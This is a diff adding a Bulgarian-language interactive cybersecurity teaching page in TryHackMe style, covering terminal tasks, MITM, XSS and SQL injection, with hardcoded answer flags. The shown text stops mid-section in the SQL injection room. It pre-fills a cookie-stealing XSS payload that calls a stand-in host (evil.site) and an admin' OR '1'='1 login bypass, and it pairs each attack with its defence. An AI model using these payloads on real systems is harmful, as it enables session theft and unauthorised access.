@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html lang="bg" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberMath OPS | TryHackMe Style Interactive Room • д-р Адем Зейнев</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script>
+        window.MathJax = { tex: { inlineMath: [['$', '$'], ['\\(', '\\)']] } };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=JetBrains+Mono:wght@400;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #020617; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        .stage-panel { display: none; animation: fadeSlide 0.25s ease-out; }
+        .stage-panel.active { display: block; }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes packet-flow {
+            0% { left: 10%; opacity: 0; }
+            15% { opacity: 1; }
+            85% { opacity: 1; }
+            100% { left: 86%; opacity: 0; }
+        }
+        .packet-dot {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: packet-flow 2.4s linear infinite;
+        }
+        .nav-item.active {
+            background: linear-gradient(90deg, rgba(16, 185, 129, 0.18), rgba(6, 182, 212, 0.08));
+            border-color: rgba(16, 185, 129, 0.55);
+            color: #ffffff;
+        }
+        body.hide-guides .guide-box { display: none !important; }
+    </style>
+</head>
+<body class="text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-emerald-500 selection:text-white">
+
+    <!-- Matrix Rain Background -->
+    <canvas id="matrix-bg" class="fixed inset-0 pointer-events-none opacity-15 z-0"></canvas>
+
+    <!-- Top Command Header with TryHackMe Rank & XP -->
+    <header class="sticky top-0 z-30 border-b border-slate-800/90 bg-slate-950/95 backdrop-blur-xl shrink-0">
+        <div class="max-w-[1600px] mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-rose-500 via-emerald-500 to-cyan-500 flex items-center justify-center text-slate-950 font-black shadow-lg">
+                    <i class="fa-solid fa-terminal text-lg"></i>
+                </div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <span class="font-black text-lg tracking-tight text-white">CyberMath <span class="text-emerald-400">OPS</span></span>
+                        <span class="px-2 py-0.5 text-[10px] font-bold uppercase tracking-widest rounded-full bg-rose-500/20 text-rose-300 border border-rose-500/40">THM ROOM EDITION</span>
+                    </div>
+                    <p class="text-[11px] text-slate-400 hidden sm:block">
+                        Ранг: <strong id="user-rank" class="text-cyan-400">[0x1] Script Kiddie</strong> • XP: <strong id="user-xp" class="text-emerald-400">0 XP</strong> • Задачи: <strong id="global-score-pill" class="text-amber-400">0 / 11</strong>
+                    </p>
+                </div>
+            </div>
+
+            <div class="flex items-center gap-2">
+                <button id="guide-toggle-btn" onclick="toggleGuides()" class="px-3 py-1.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/40 text-xs font-bold text-emerald-300 transition flex items-center gap-1.5">
+                    <i class="fa-solid fa-book-open"></i> <span class="hidden sm:inline">Инструкции: ВКЛ.</span>
+                </button>
+                <button onclick="toggleSound()" class="px-3 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs font-semibold text-emerald-400 transition" title="Звукови ефекти">
+                    <i id="sound-icon" class="fa-solid fa-volume-high"></i>
+                </button>
+                <button onclick="toggleFullscreen()" class="hidden md:flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs font-semibold text-cyan-300 transition" title="Режим зала / проектор">
+                    <i class="fa-solid fa-expand"></i> Проектор
+                </button>
+                <a href="index.html" class="px-3.5 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs font-semibold text-slate-200 transition flex items-center gap-1.5">
+                    <i class="fa-solid fa-arrow-left text-emerald-400"></i> Портфолио
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Workspace -->
+    <div class="relative z-10 flex-1 max-w-[1600px] w-full mx-auto px-4 sm:px-6 py-6 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+
+        <!-- Left Navigation Sidebar (8 Screens) -->
+        <aside class="lg:col-span-3 bg-slate-950/90 border border-slate-800 rounded-3xl p-4 space-y-1.5 lg:sticky lg:top-20">
+            <div class="px-2 pb-2 border-b border-slate-800 flex items-center justify-between">
+                <span class="text-[11px] font-mono uppercase tracking-widest text-slate-400">TryHackMe Стаи</span>
+                <span id="screen-counter" class="text-xs font-mono font-bold text-emerald-400">1 / 8</span>
+            </div>
+
+            <button onclick="switchScreen(1)" id="nav-1" class="nav-item active w-full text-left p-2.5 rounded-2xl border border-rose-500/30 bg-rose-950/15 hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-1" class="w-7 h-7 rounded-xl bg-rose-500/25 text-rose-300 font-mono text-xs font-black flex items-center justify-center shrink-0">01</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-black text-rose-200 truncate">THM Room: Kali Terminal</div>
+                    <div class="text-[10px] text-slate-400 truncate">4 задачи + Flag Hunting</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(2)" id="nav-2" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-2" class="w-7 h-7 rounded-xl bg-cyan-500/20 text-cyan-400 font-mono text-xs font-black flex items-center justify-center shrink-0">02</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">MITM Packet Sniffer</div>
+                    <div class="text-[10px] text-slate-400 truncate">HTTP vs TLS + задача</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(3)" id="nav-3" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-3" class="w-7 h-7 rounded-xl bg-amber-500/20 text-amber-400 font-mono text-xs font-black flex items-center justify-center shrink-0">03</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">XSS &amp; Session Hijack</div>
+                    <div class="text-[10px] text-slate-400 truncate">Бисквитки + задача</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(4)" id="nav-4" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-4" class="w-7 h-7 rounded-xl bg-rose-500/20 text-rose-400 font-mono text-xs font-black flex items-center justify-center shrink-0">04</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">SQL Injection Арена</div>
+                    <div class="text-[10px] text-slate-400 truncate">Булева логика + задача</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(5)" id="nav-5" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-5" class="w-7 h-7 rounded-xl bg-orange-500/20 text-orange-400 font-mono text-xs font-black flex items-center justify-center shrink-0">05</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">Brute-Force &amp; Ентропия</div>
+                    <div class="text-[10px] text-slate-400 truncate">Изчислителна задача</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(6)" id="nav-6" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-6" class="w-7 h-7 rounded-xl bg-teal-500/20 text-teal-400 font-mono text-xs font-black flex items-center justify-center shrink-0">06</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">SHA-256 Лавинен ефект</div>
+                    <div class="text-[10px] text-slate-400 truncate">Интегритет + задача</div>
+                </div>
+            </button>
+
+            <button onclick="switchScreen(7)" id="nav-7" class="nav-item w-full text-left p-2.5 rounded-2xl border border-transparent hover:bg-slate-900 transition flex items-center gap-3">
+                <span id="badge-7" class="w-7 h-7 rounded-xl bg-purple-500/20 text-purple-400 font-mono text-xs font-black flex items-center justify-center shrink-0">07</span>
+                <div class="min-w-0">
+                    <div class="text-xs font-extrabold truncate">Стеганография (LSB)</div>
+                    <div class="text-[10px] text-slate-400 truncate">Капацитет + задача</div>
+                </div>
+            </button>
+
+            <div class="pt-2 border-t border-slate-800">
+                <button onclick="switchScreen(8)" id="nav-8" class="nav-item w-full text-left p-3 rounded-2xl border border-emerald-500/30 bg-emerald-950/20 hover:bg-emerald-950/40 transition flex items-center gap-3">
+                    <span class="w-7 h-7 rounded-xl bg-emerald-500 text-slate-950 font-mono text-xs font-black flex items-center justify-center shrink-0"><i class="fa-solid fa-award"></i></span>
+                    <div class="min-w-0">
+                        <div class="text-xs font-black text-emerald-300 truncate">08. Финален SOC/CTF Тест</div>
+                        <div class="text-[10px] text-slate-400 truncate">Казуси + Сертификат</div>
+                    </div>
+                </button>
+            </div>
+
+            <div class="pt-2 border-t border-slate-800 text-[11px] text-slate-400 px-2">
+                Преподавател: <strong class="text-slate-200">д-р Адем Зейнев</strong>
+            </div>
+        </aside>
+
+        <!-- Right Large Full-Screen Stage Container -->
+        <main class="lg:col-span-9 bg-slate-950/95 border border-slate-800 rounded-3xl p-6 sm:p-8 lg:p-10 shadow-2xl min-h-[82vh] flex flex-col justify-between">
+
+            <!-- SCREEN 01: TRYHACKME INTERACTIVE TERMINAL ROOM -->
+            <div id="screen-1" class="stage-panel active space-y-5">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <div class="flex items-center gap-2">
+                            <span class="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 font-mono text-[10px] font-bold">TRYHACKME ROOM</span>
+                            <span class="text-xs font-mono text-emerald-400">Target IP: 10.10.42.15 (Active)</span>
+                        </div>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Интерактивна Linux &amp; Pentest лаборатория „Operation Ablanitsa“</h1>
+                    </div>
+                    <div class="flex flex-wrap gap-1.5 text-[11px] font-mono">
+                        <button onclick="insertTermCmd('help')" class="px-2.5 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-cyan-300">help</button>
+                        <button onclick="insertTermCmd('ls -la')" class="px-2.5 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-emerald-300">ls -la</button>
+                        <button onclick="insertTermCmd('nmap -sV 10.10.42.15')" class="px-2.5 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-amber-300">nmap</button>
+                        <button onclick="insertTermCmd('crack-rsa 3599 7')" class="px-2.5 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-rose-300">crack-rsa</button>
+                    </div>
+                </div>
+
+                <!-- Split View: Left Interactive Terminal + Right TryHackMe Tasks (1 to 4) -->
+                <div class="grid grid-cols-1 xl:grid-cols-12 gap-5">
+                    <!-- Interactive Linux Shell (7 cols) -->
+                    <div class="xl:col-span-7 bg-black rounded-2xl border border-slate-800 flex flex-col justify-between overflow-hidden min-h-[430px]">
+                        <div class="bg-slate-900/90 px-4 py-2 border-b border-slate-800 flex items-center justify-between text-xs font-mono">
+                            <div class="flex items-center gap-1.5">
+                                <span class="w-3 h-3 rounded-full bg-rose-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-amber-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-emerald-500"></span>
+                                <span class="text-slate-400 ml-2">student@thm-kali:~</span>
+                            </div>
+                            <button onclick="clearTerm()" class="text-[11px] text-slate-400 hover:text-white">clear</button>
+                        </div>
+
+                        <div id="thm-term-output" class="p-4 font-mono text-xs text-slate-300 space-y-1.5 overflow-y-auto max-h-[340px] flex-1">
+                            <div class="text-emerald-400 font-bold">Добре дошли в интерактивната стая на CyberMath OPS (TryHackMe Edition)!</div>
+                            <div class="text-slate-400">Напишете <code class="text-cyan-300">help</code>, за да видите наличните хакерски и Linux команди, или кликнете върху бързите бутони горе.</div>
+                        </div>
+
+                        <form onsubmit="handleTermSubmit(event)" class="bg-slate-950 px-4 py-2.5 border-t border-slate-800 flex items-center gap-2 font-mono text-xs">
+                            <span class="text-emerald-400 font-bold shrink-0">student@kali:~$</span>
+                            <input id="thm-term-input" type="text" autocomplete="off" placeholder="Въведете команда (напр. ls -la)..."
+                                class="flex-1 bg-transparent text-white outline-none">
+                            <button type="submit" class="px-3 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold">Enter</button>
+                        </form>
+                    </div>
+
+                    <!-- TryHackMe Style Tasks & Flag Inputs (5 cols) -->
+                    <div class="xl:col-span-5 space-y-3">
+                        <!-- Task 1 -->
+                        <div class="p-3.5 rounded-2xl bg-slate-900 border border-slate-800 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs font-bold text-cyan-300">Task 1: Скрити файлове в Linux</span>
+                                <button onclick="toggleHint(1)" class="text-[11px] font-mono text-amber-400 hover:underline"><i class="fa-solid fa-lightbulb"></i> Hint</button>
+                            </div>
+                            <p class="text-[11px] text-slate-300">Използвайте <code>ls -la</code> и <code>cat</code> в терминала, за да прочетете скрития файл с бележки и да намерите първия флаг.</p>
+                            <div id="hint-1" class="hidden text-[11px] font-mono text-amber-300 bg-amber-950/40 p-2 rounded-lg">Подсказка: Напишете <code>ls -la</code>, а след това <code>cat .secret_notes</code></div>
+                            <div class="flex gap-1.5">
+                                <input id="flag-in-1" type="text" placeholder="THM{...}" class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1.5 font-mono text-xs text-white">
+                                <button onclick="submitThmFlag(1, 'THM{LINUX_HIDDEN_FILES_101}')" id="flag-btn-1" class="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs">Submit</button>
+                            </div>
+                        </div>
+
+                        <!-- Task 2 -->
+                        <div class="p-3.5 rounded-2xl bg-slate-900 border border-slate-800 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs font-bold text-cyan-300">Task 2: Разузнаване с Nmap</span>
+                                <button onclick="toggleHint(2)" class="text-[11px] font-mono text-amber-400 hover:underline"><i class="fa-solid fa-lightbulb"></i> Hint</button>
+                            </div>
+                            <p class="text-[11px] text-slate-300">Сканирайте целта <code>10.10.42.15</code> с <code>nmap -sV 10.10.42.15</code>. Кой порт е отворен за администраторския панел?</p>
+                            <div id="hint-2" class="hidden text-[11px] font-mono text-amber-300 bg-amber-950/40 p-2 rounded-lg">Подсказка: Стартирайте <code>nmap -sV 10.10.42.15</code> и вижте нестандартния HTTP порт.</div>
+                            <div class="flex gap-1.5">
+                                <input id="flag-in-2" type="text" placeholder="Номер на порт (напр. 8080)" class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1.5 font-mono text-xs text-white">
+                                <button onclick="submitThmFlag(2, '8443')" id="flag-btn-2" class="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs">Submit</button>
+                            </div>
+                        </div>
+
+                        <!-- Task 3 -->
+                        <div class="p-3.5 rounded-2xl bg-slate-900 border border-slate-800 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs font-bold text-cyan-300">Task 3: Разбиване на RSA ключ</span>
+                                <button onclick="toggleHint(3)" class="text-[11px] font-mono text-amber-400 hover:underline"><i class="fa-solid fa-lightbulb"></i> Hint</button>
+                            </div>
+                            <p class="text-[11px] text-slate-300">Откритият публичен ключ е $n = 3599, e = 7$. Използвайте <code>crack-rsa 3599 7</code>, за да намерите частния ключ $d$.</p>
+                            <div id="hint-3" class="hidden text-[11px] font-mono text-amber-300 bg-amber-950/40 p-2 rounded-lg">Подсказка: Изпълнете <code>crack-rsa 3599 7</code> в терминала.</div>
+                            <div class="flex gap-1.5">
+                                <input id="flag-in-3" type="text" placeholder="Стойност на d" class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1.5 font-mono text-xs text-white">
+                                <button onclick="submitThmFlag(3, '2983')" id="flag-btn-3" class="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs">Submit</button>
+                            </div>
+                        </div>
+
+                        <!-- Task 4 -->
+                        <div class="p-3.5 rounded-2xl bg-slate-900 border border-slate-800 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs font-bold text-rose-300">Task 4: Root Privilege Escalation</span>
+                                <button onclick="toggleHint(4)" class="text-[11px] font-mono text-amber-400 hover:underline"><i class="fa-solid fa-lightbulb"></i> Hint</button>
+                            </div>
+                            <p class="text-[11px] text-slate-300">Използвайте <code>sudo cat /root/root.txt</code>, за да вземете финалния Root флаг.</p>
+                            <div id="hint-4" class="hidden text-[11px] font-mono text-amber-300 bg-amber-950/40 p-2 rounded-lg">Подсказка: Напишете <code>sudo cat /root/root.txt</code></div>
+                            <div class="flex gap-1.5">
+                                <input id="flag-in-4" type="text" placeholder="THM{...}" class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1.5 font-mono text-xs text-white">
+                                <button onclick="submitThmFlag(4, 'THM{ROOT_MASTER_OF_CRYPTO_2026}')" id="flag-btn-4" class="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs">Submit</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SCREEN 02: MITM PACKET SNIFFER -->
+            <div id="screen-2" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-cyan-400">СТАЯ 02 / 08 • NETWORK PACKET SNIFFING</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">Man-in-the-Middle (MITM): HTTP срещу HTTPS / TLS 1.3</h1>
+                    </div>
+                    <button id="tls-btn" onclick="toggleTls()" class="px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black">
+                        Протокол: HTTP (Незащитен)
+                    </button>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Превключваме бутона <strong>HTTP / HTTPS</strong> и анализираме прихванатия трафик в конзолата на Wireshark.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        При HTTP паролата пътува в чист текст по локалната мрежа (ARP Spoofing / Evil Twin Wi-Fi).
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        TLS 1.3 криптира канала и удостоверява сървъра с цифров сертификат (PKI).
+                    </div>
+                </div>
+
+                <div class="relative bg-slate-900 rounded-3xl p-8 border border-slate-800 flex items-center justify-between overflow-hidden">
+                    <div class="z-10 text-center">
+                        <div class="w-14 h-14 mx-auto rounded-2xl bg-slate-800 flex items-center justify-center text-cyan-400 text-xl"><i class="fa-solid fa-laptop"></i></div>
+                        <div class="text-xs font-mono text-slate-300 mt-1.5 font-bold">Клиент</div>
+                    </div>
+                    <div class="z-10 text-center">
+                        <div id="mitm-hacker-icon" class="w-14 h-14 mx-auto rounded-full bg-rose-500/20 border-2 border-rose-500/60 flex items-center justify-center text-rose-400 text-xl"><i class="fa-solid fa-user-secret"></i></div>
+                        <div class="text-xs font-mono text-rose-400 mt-1.5 font-bold">Sniffer</div>
+                    </div>
+                    <div class="z-10 text-center">
+                        <div class="w-14 h-14 mx-auto rounded-2xl bg-slate-800 flex items-center justify-center text-emerald-400 text-xl"><i class="fa-solid fa-server"></i></div>
+                        <div class="text-xs font-mono text-slate-300 mt-1.5 font-bold">Сървър</div>
+                    </div>
+                    <div class="absolute left-16 right-16 top-1/2 h-1 bg-slate-800"></div>
+                    <div id="packet-badge" class="packet-dot px-3 py-1 rounded-lg bg-rose-500 text-white font-mono text-xs font-bold">
+                        PASS=TajnaParola2026
+                    </div>
+                </div>
+
+                <div id="sniffer-dump" class="bg-black p-4 rounded-2xl border border-slate-800 font-mono text-xs sm:text-sm text-rose-300">
+                    [WIRESHARK] POST /login HTTP/1.1 | Payload: <strong>user=a.zeynev&amp;pass=TajnaParola2026</strong>
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #02</span>
+                        <span id="task-status-2" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
+                        <strong>Задача:</strong> Активирайте <strong>HTTPS / TLS 1.3</strong> горе вдясно. Какъв механизъм използва TLS 1.3, за да договорят клиентът и сървърът общ таен ключ за AES-256 пред очите на подслушвача?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(2, false, 'Грешно: MD5 е остаряла хеш функция и не служи за обмен на ключове.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">MD5 хеширане</button>
+                        <button onclick="checkTask(2, true, 'Вярно! Ефемерният обмен на ключове на Дифи-Хелман (ECDHE) позволява договаряне на таен ключ по публичен канал с Forward Secrecy.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Обмен на ключове на Дифи-Хелман (ECDHE)</button>
+                        <button onclick="checkTask(2, false, 'Грешно: Base64 е просто кодиране, а не криптиране.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-xs">Base64 кодиране</button>
+                    </div>
+                    <div id="task-feedback-2" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 03: XSS & SESSION HIJACKING -->
+            <div id="screen-3" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-amber-400">СТАЯ 03 / 08 • CROSS-SITE SCRIPTING (XSS)</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">XSS Инжекция и кражба на сесийна бисквитка</h1>
+                    </div>
+                    <button id="xss-shield-btn" onclick="toggleXssShield()" class="px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black">
+                        XSS Филтър: OFF (Уязвим)
+                    </button>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Публикуваме скрипта при изключен филтър, а после активираме <strong>XSS Филтър: ON</strong> и тестваме отново.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        Зловредният код чете <code>document.cookie</code> и открадва активната сесия на администратора.
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        Използваме HTML екраниране, Content Security Policy (CSP) и <code>HttpOnly</code> флагове.
+                    </div>
+                </div>
+
+                <div class="bg-slate-900 p-5 rounded-2xl border border-slate-800 space-y-3">
+                    <div class="text-xs font-mono text-slate-400">
+                        Активна бисквитка: <span class="px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-500/30">SESSION_ID=9f8a7b6c5d4e_ADMIN</span>
+                    </div>
+                    <div class="flex flex-col sm:flex-row gap-3">
+                        <input id="xss-input" type="text" value="<script>fetch('https://evil.site/steal?c=' + document.cookie)</script>"
+                            class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-2.5 font-mono text-xs sm:text-sm text-white">
+                        <button onclick="runXssDemo()" class="px-5 py-2.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-slate-950 font-black text-xs sm:text-sm shrink-0">
+                            Публикувай коментар
+                        </button>
+                    </div>
+                </div>
+
+                <div id="xss-output" class="bg-black p-4 rounded-2xl border border-slate-800 font-mono text-xs sm:text-sm text-slate-300">
+                    Натиснете „Публикувай коментар“, за да симулирате атаката...
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #03</span>
+                        <span id="task-status-3" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
+                        <strong>Задача:</strong> Включете <strong>XSS Филтър: ON</strong> и публикувайте коментара. Кой HTTP атрибут върху самата сесийна бисквитка забранява на JavaScript (<code>document.cookie</code>) изобщо да я достъпва?
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="checkTask(3, true, 'Вярно! Флагът HttpOnly гарантира, че бисквитката се изпраща само по HTTP/HTTPS заявки и е невидима за document.cookie.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">HttpOnly</button>
+                        <button onclick="checkTask(3, false, 'Грешно: Max-Age определя само срока на валидност на бисквитката.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">Max-Age=3600</button>
+                        <button onclick="checkTask(3, false, 'Грешно: Path=/ определя само за кои URL пътища важи бисквитката.')" class="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 font-mono text-xs">Path=/</button>
+                    </div>
+                    <div id="task-feedback-3" class="text-xs font-medium hidden"></div>
+                </div>
+            </div>
+
+            <!-- SCREEN 04: SQL INJECTION -->
+            <div id="screen-4" class="stage-panel space-y-6">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-mono uppercase tracking-widest text-rose-400">СТАЯ 04 / 08 • БУЛЕВА АЛГЕБРА ($P \lor \top \equiv \top$)</span>
+                        <h1 class="text-2xl sm:text-3xl font-black text-white mt-1">SQL Injection: Пробив в автентикацията без парола</h1>
+                    </div>
+                    <button id="sqli-shield-btn" onclick="toggleSqliDefense()" class="px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black">
+                        Сървър: УЯЗВИМ (String Concat)
+                    </button>
+                </div>
+
+                <div class="guide-box grid grid-cols-1 md:grid-cols-3 gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 text-xs sm:text-sm">
+                    <div class="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/20">
+                        <div class="font-bold text-cyan-300 mb-1">1. Какво правим:</div>
+                        Изпълняваме вход с <code>admin' OR '1'='1</code>, а след това превключваме на <strong>Prepared Statements</strong>.
+                    </div>
+                    <div class="p-3 rounded-xl bg-amber-950/30 border border-amber-500/20">
+                        <div class="font-bold text-amber-300 mb-1">2. Какво се случва:</div>
+                        Булевата тавтология <code>'1'='1'</code> прави условието <code>WHERE</code> винаги вярно (TRUE).
+                    </div>
+                    <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/20">
+                        <div class="font-bold text-emerald-300 mb-1">3. Как се защитаваме:</div>
+                        Параметризираните заявки отделят SQL кода от потребителските параметри.
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row gap-3 bg-slate-900 p-4 rounded-2xl border border-slate-800">
+                    <input id="sqli-user" type="text" value="admin' OR '1'='1" oninput="updateSqlPreview()"
+                        class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-2.5 font-mono text-sm text-white">
+                    <button onclick="executeSqliLogin()" class="px-5 py-2.5 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-black text-sm shrink-0">
+                        Изпълни вход →
+                    </button>
+                </div>
+
+                <div id="sql-live-query" class="p-4 rounded-2xl bg-black border border-slate-800 font-mono text-xs sm:text-sm text-cyan-300 break-all"></div>
+                <div id="sqli-result-box" class="p-4 rounded-2xl bg-slate-900 border border-slate-800 font-mono text-xs sm:text-sm text-slate-300">
+                    Натиснете „Изпълни вход →“, за да тествате SQL инжекцията.
+                </div>
+
+                <div class="p-5 rounded-2xl bg-indigo-950/25 border border-indigo-500/35 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono uppercase tracking-wider text-indigo-300 font-bold"><i class="fa-solid fa-clipboard-question mr-1.5"></i> Практическа задача #04</span>
+                        <span id="task-status-4" class="text-xs font-mono text-slate-400">Нерешена</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-slate-200">
